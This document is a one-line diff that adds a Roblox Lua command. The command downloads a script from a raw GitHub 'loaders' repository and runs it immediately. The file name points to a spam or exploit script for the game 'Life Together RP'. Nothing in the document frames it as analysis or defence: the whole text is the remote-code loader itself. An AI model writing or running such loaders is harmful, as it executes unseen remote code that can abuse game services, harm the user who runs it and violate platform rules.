@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/lifetogether-rp-spam3-bcobj2z7jd759e.lua"))()
